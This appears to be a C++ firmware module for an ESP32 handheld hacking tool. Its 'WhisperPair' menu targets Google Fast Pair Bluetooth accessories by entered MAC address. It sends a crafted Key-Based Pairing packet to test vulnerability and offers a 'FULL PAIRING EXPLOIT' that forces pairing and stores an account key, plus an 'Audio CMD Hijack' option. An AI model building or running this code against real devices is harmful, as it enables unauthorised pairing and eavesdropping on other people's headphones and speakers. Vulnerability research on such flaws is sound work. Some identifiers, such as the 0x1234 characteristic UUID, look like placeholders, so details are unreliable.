#include "whisperpair.h"
#include "whisperpair_audio.h"
#include "whisperpair_scan.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"

extern std::vector<String> fastPairDevices;

bool requireSimpleConfirmation(const char* message) {
    drawMainBorderWithTitle("CONFIRM");
    padprintln(message);
    padprintln("");
    padprintln("Press SEL to confirm");
    padprintln("or ESC to cancel");

    while(true) {
        if(check(EscPress)) {
            displayMessage("Cancelled", "", "", "", TFT_WHITE);
            delay(1000);
            return false;
        }

        if(check(SelPress)) {
            displayMessage("Confirmed!", "", "", "", TFT_WHITE);
            delay(500);
            return true;
        }

        delay(50);
    }
}

bool attemptKeyBasedPairing(NimBLEAddress target) {
    displayMessage("Connecting to target...", "", "", "", TFT_WHITE);

    NimBLEClient* pClient = NimBLEDevice::createClient();

    if(!pClient->connect(target)) {
        displayMessage("Connection failed", "", "", "", TFT_WHITE);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    displayMessage("Connected, discovering...", "", "", "", TFT_WHITE);

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(pService == nullptr) {
        displayMessage("Fast Pair service not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(pChar == nullptr) {
        displayMessage("KBP char not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;

    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);

    memcpy(&packet[2], targetBytes, 6);

    esp_fill_random(&packet[8], 8);

    displayMessage("Sending test packet...", "", "", "", TFT_WHITE);

    if(pChar->writeValue(packet, 16, false)) {
        displayMessage("Packet sent, checking...", "", "", "", TFT_WHITE);
        delay(100);

        bool vulnerable = pChar->canRead() || pChar->canNotify();

        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);

        if(vulnerable) {
            displayMessage("DEVICE VULNERABLE!", "", "", "", TFT_WHITE);
            return true;
        } else {
            displayMessage("No response - may be patched", "", "", "", TFT_WHITE);
            return false;
        }
    }

    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

void testFastPairVulnerability() {
    String input = keyboard("", 17, "Target MAC (AA:BB:CC:DD:EE:FF)");
    if(input.isEmpty()) return;

    NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);

    if(!requireSimpleConfirmation("Test vulnerability?")) {
        return;
    }

    bool vulnerable = attemptKeyBasedPairing(target);

    Serial.printf("[WhisperPair] %s - %s\n", 
        input.c_str(), 
        vulnerable ? "VULNERABLE" : "PATCHED/SAFE"
    );

    delay(3000);
}

void whisperPairMenu() {
    std::vector<Option> options;

    options.push_back({"[🔍] Scan & Test", []() {
        whisperPairScanMenu();
    }});

    options.push_back({"[-] Test Vulnerability", []() {
        testFastPairVulnerability();
    }});

    options.push_back({"[ECDH] Crypto Benchmark", []() {
        extern void whisperPairFullBenchmark();
        whisperPairFullBenchmark();
        padprintln("");
        padprintln("Press any key");
        while(!check(AnyKeyPress)) delay(50);
    }});

    options.push_back({"[$$] Full Pair Test", []() {
        if(!requireSimpleConfirmation("FULL PAIRING EXPLOIT")) return;

        String input = keyboard("", 17, "Target MAC (AA:BB:CC:DD:EE:FF)");
        if(input.isEmpty()) return;

        NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);

        displayMessage("Starting full exploit...", "", "", "", TFT_WHITE);
        padprintln("1. Connect to device");
        padprintln("2. ECDH key exchange");
        padprintln("3. Complete pairing");
        padprintln("4. Store account key");

        if(!requireSimpleConfirmation("CONFIRM FULL EXPLOIT")) return;

        extern bool whisperPairFullExploit(NimBLEAddress);
        bool success = whisperPairFullExploit(target);

        if(success) {
            displayMessage("EXPLOIT SUCCESSFUL!", "", "", "", TFT_WHITE);
            displayMessage("Device paired", "", "", "", TFT_WHITE);
        } else {
            displayMessage("Exploit failed", "", "", "", TFT_WHITE);
            displayMessage("May be patched", "", "", "", TFT_WHITE);
        }
        delay(3000);
    }});

    options.push_back({"[🎤] Audio CMD Hijack", []() {
        audioCommandHijackTest();
    }});

    options.push_back({"Back", []() { returnToMenu = true; }});

    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
}